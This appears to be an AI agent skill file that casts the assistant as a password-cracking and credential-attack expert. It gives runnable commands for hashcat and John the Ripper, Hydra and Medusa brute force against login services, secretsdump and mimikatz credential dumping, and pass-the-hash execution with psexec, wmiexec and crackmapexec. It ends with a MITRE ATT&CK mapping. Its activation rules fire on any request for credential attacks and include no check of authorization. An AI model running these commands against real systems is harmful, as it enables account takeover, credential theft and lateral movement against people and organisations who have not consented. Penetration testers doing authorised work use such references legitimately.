---
name: cracking-passwords
description: Crack password hashes using hashcat/john, perform password spraying, brute force authentication, and execute pass-the-hash attacks. Use when cracking credentials or performing password-based attacks.
---

# Password Attacks and Credential Cracking Skill

You are a password cracking and credential attack expert. Use this skill when the user requests help with:

- Password hash cracking (hashcat, john)
- Hash identification and extraction
- Credential spraying and brute forcing
- Rainbow table attacks
- Pass-the-hash techniques
- Wordlist generation
- Rule-based attacks

## When to Use

Activate this skill when the user asks to:
- Crack password hashes
- Identify unknown hash types
- Perform password spraying
- Generate wordlists
- Optimize hashcat/john performance
- Extract and crack credentials
- Perform pass-the-hash attacks
- Help with credential-based attacks

## When NOT to Use

- **Online brute force against a live service** — that is testing, not cracking;
  use `testing-web-applications` or `enumerating-network-services`, and mind lockouts
- **Obtaining the hashes in the first place** — use the relevant privilege
  escalation or `attacking-active-directory` skill
- **Reviewing how an application stores passwords** — use `reviewing-cryptography`

## Core Methodologies

### 1. Hash Identification

**Identify Hash Type:**
```bash
# hashid
hashid 'hash_here'
hashid -m 'hash_here'  # Show hashcat mode

# hash-identifier
hash-identifier

# haiti
haiti 'hash_here'

# Manual identification by format
# MD5: 32 hex chars
# SHA1: 40 hex chars
# SHA256: 64 hex chars
# NTLM: 32 hex chars (same as MD5 but context differs)
# bcrypt: $2a$, $2b$, $2y$ prefix
```

**Common Hash Formats:**
```
MD5: 5f4dcc3b5aa765d61d8327deb882cf99
SHA1: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
SHA256: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
NTLM: 209c6174da490caeb422f3fa5a7ae634
NTLMv2: username::domain:challenge:response:response
bcrypt: $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
Linux SHA512: $6$rounds=5000$...
```

### 2. Hashcat Basics

**Installation:**
```bash
# Kali Linux
apt install hashcat

# Check GPUs
hashcat -I
```

**Basic Hashcat Usage:**
```bash
# Dictionary attack
hashcat -m <hash_type> -a 0 hashes.txt wordlist.txt

# Dictionary + rules
hashcat -m <hash_type> -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Brute force
hashcat -m <hash_type> -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# Combination attack
hashcat -m <hash_type> -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Show cracked passwords
hashcat -m <hash_type> hashes.txt --show

# Resume session
hashcat -m <hash_type> hashes.txt wordlist.txt --session mysession
hashcat --session mysession --restore
```

**Common Hash Types (-m flag):**
```bash
0     = MD5
100   = SHA1
1400  = SHA256
1700  = SHA512
1000  = NTLM
5600  = NetNTLMv2
3200  = bcrypt
1800  = sha512crypt (Linux)
7500  = Kerberos 5 AS-REP (krb5asrep)
13100 = Kerberos 5 TGS-REP (krb5tgs)
18200 = Kerberos 5 AS-REP (asreproast)
16800 = WPA-PMKID-PBKDF2
22000 = WPA-PBKDF2-PMKID+EAPOL
```

**Hashcat Attack Modes:**
```bash
-a 0  # Dictionary attack
-a 1  # Combination attack
-a 3  # Brute-force attack
-a 6  # Hybrid wordlist + mask
-a 7  # Hybrid mask + wordlist
```

**Hashcat Masks:**
```bash
?l = lowercase letters (a-z)
?u = uppercase letters (A-Z)
?d = digits (0-9)
?s = special characters
?a = all characters (?l?u?d?s)
?b = binary (0x00 - 0xff)

# Examples
?u?l?l?l?l?d?d  # Password01
?d?d?d?d        # 4-digit PIN
?a?a?a?a?a?a    # 6 characters (any)
```

### 3. John the Ripper

**Basic John Usage:**
```bash
# Auto-detect and crack
john hashes.txt

# Specify format
john --format=NT hashes.txt
john --format=Raw-SHA256 hashes.txt

# With wordlist
john --wordlist=rockyou.txt hashes.txt

# With rules
john --wordlist=wordlist.txt --rules hashes.txt

# Show cracked passwords
john --show hashes.txt
john --show --format=NT hashes.txt

# List formats
john --list=formats
```

**Common John Formats:**
```bash
Raw-MD5
Raw-SHA1
Raw-SHA256
NT (NTLM)
LM
bcrypt
sha512crypt
krb5asrep
krb5tgs
```

**Unshadow (Linux):**
```bash
# Combine passwd and shadow files
unshadow passwd shadow > unshadowed.txt
john unshadowed.txt
```

### 4. Specific Hash Type Attacks

**NTLM Hashes:**
```bash
# Hashcat
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule

# John
john --format=NT --wordlist=rockyou.txt ntlm.txt
```

**NTLMv2 (NetNTLMv2):**
```bash
# Hashcat
hashcat -m 5600 ntlmv2.txt rockyou.txt

# Captured from Responder
hashcat -m 5600 Responder-Session.txt rockyou.txt
```

**Kerberoast (TGS-REP):**
```bash
# Hashcat (RC4)
hashcat -m 13100 tgs.txt rockyou.txt --force

# John
john --format=krb5tgs --wordlist=rockyou.txt tgs.txt
```

**ASREPRoast:**
```bash
# Hashcat
hashcat -m 18200 asrep.txt rockyou.txt

# John
john --format=krb5asrep asrep.txt
```

**bcrypt:**
```bash
# Hashcat (slow!)
hashcat -m 3200 bcrypt.txt wordlist.txt

# John
john --format=bcrypt bcrypt.txt
```

**Linux SHA512 ($6$):**
```bash
# Hashcat
hashcat -m 1800 shadow.txt rockyou.txt

# John
john --format=sha512crypt shadow.txt
```

**WPA/WPA2:**
```bash
# Convert pcap to hashcat format
hcxpcapngtool -o hash.hc22000 capture.pcap

# Crack PMKID
hashcat -m 22000 hash.hc22000 wordlist.txt

# Or convert with aircrack tools
aircrack-ng -J output capture.cap
hccap2john output.hccap > hash.john
john hash.john
```

### 5. Wordlist Generation and Credential Spraying

Wordlist generation (CeWL, crunch, John rules, maskprocessor, CUPP) and
credential spraying (SMB, Kerberos, RDP) command references live in
[references/wordlist-generation-and-spraying.md](references/wordlist-generation-and-spraying.md).

### 6. Online Brute Force

**Hydra:**
```bash
# HTTP POST login
hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# SSH
hydra -l root -P passwords.txt ssh://10.10.10.10

# FTP
hydra -l admin -P passwords.txt ftp://10.10.10.10

# SMB
hydra -L users.txt -P passwords.txt smb://10.10.10.10

# RDP
hydra -L users.txt -P passwords.txt rdp://10.10.10.10
```

**Medusa:**
```bash
# SSH
medusa -h 10.10.10.10 -u admin -P passwords.txt -M ssh

# SMB
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M smbnt
```

### 8. Pass-the-Hash

**Extract NTLM Hashes:**
```bash
# secretsdump (from SAM)
secretsdump.py -sam sam.hive -system system.hive LOCAL

# secretsdump (from DC)
secretsdump.py domain/user:password@10.10.10.10

# mimikatz
sekurlsa::logonpasswords
lsadump::sam
```

**Use NTLM Hash:**
```bash
# pth-winexe
pth-winexe -U domain/user%hash //10.10.10.10 cmd

# crackmapexec
crackmapexec smb 10.10.10.10 -u administrator -H 'hash' -x whoami

# psexec.py
psexec.py -hashes :hash administrator@10.10.10.10

# wmiexec.py
wmiexec.py -hashes :hash administrator@10.10.10.10
```

## Useful Wordlists

**Common Locations:**
```bash
# Kali Linux
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/

# Download rockyou
gunzip /usr/share/wordlists/rockyou.txt.gz
```

**SecLists:**
```bash
# Download
git clone https://github.com/danielmiessler/SecLists.git

# Common passwords
SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
SecLists/Passwords/Common-Credentials/10k-most-common.txt
```

**Custom Wordlists:**
```bash
# Generate targeted wordlist
# Combine company name, years, common patterns
# Example: CompanyName2024!, CompanyName@2024, etc.
```

## Performance Optimization

**Hashcat Optimizations:**
```bash
# Use GPU
hashcat -m 1000 hashes.txt wordlist.txt -d 1

# Increase workload
hashcat -m 1000 hashes.txt wordlist.txt -w 3  # 1-4, higher = faster

# Show status
hashcat -m 1000 hashes.txt wordlist.txt --status --status-timer=10

# Benchmark
hashcat -b

# Use rules efficiently
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule --loopback
```

## Troubleshooting

**Hashcat Not Using GPU:**
```bash
# Check GPU drivers
nvidia-smi  # NVIDIA
rocm-smi    # AMD

# Force specific device
hashcat -d 1 ...
```

**Hash Format Issues:**
```bash
# Remove username prefix
cut -d: -f2 hashes.txt > clean_hashes.txt

# Ensure proper format (user:hash)
cat hashes.txt | awk -F: '{print $1":"$4}'
```

**Slow Cracking:**
```bash
# Try smaller wordlist first
# Use targeted rules
# Consider cloud GPU instances
# Use mask attack for known patterns
```

## References

- [Wordlist generation and credential spraying](references/wordlist-generation-and-spraying.md) — extracted command reference
- Hashcat Wiki: https://hashcat.net/wiki/
- John the Ripper: https://www.openwall.com/john/
- SecLists: https://github.com/danielmiessler/SecLists
- HackTricks Password Attacks: https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Initial Access** (TA0001)

- [T1078](https://attack.mitre.org/techniques/T1078/) Valid Accounts _(also Persistence, Privilege Escalation, Defense Evasion)_ — see also `attacking-active-directory`, `exploiting-cloud-platforms`

**Credential Access** (TA0006)

- [T1003](https://attack.mitre.org/techniques/T1003/) OS Credential Dumping — see also `attacking-active-directory`
- [T1003.002](https://attack.mitre.org/techniques/T1003/002/) Security Account Manager — see also `escalating-windows-privileges`
- [T1003.008](https://attack.mitre.org/techniques/T1003/008/) /etc/passwd and /etc/shadow — see also `escalating-linux-privileges`
- [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force
- [T1110.002](https://attack.mitre.org/techniques/T1110/002/) Password Cracking
- [T1110.003](https://attack.mitre.org/techniques/T1110/003/) Password Spraying — see also `attacking-active-directory`
- [T1558.003](https://attack.mitre.org/techniques/T1558/003/) Kerberoasting — see also `attacking-active-directory`

**Lateral Movement** (TA0008)

- [T1550.002](https://attack.mitre.org/techniques/T1550/002/) Pass the Hash — see also `attacking-active-directory`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->
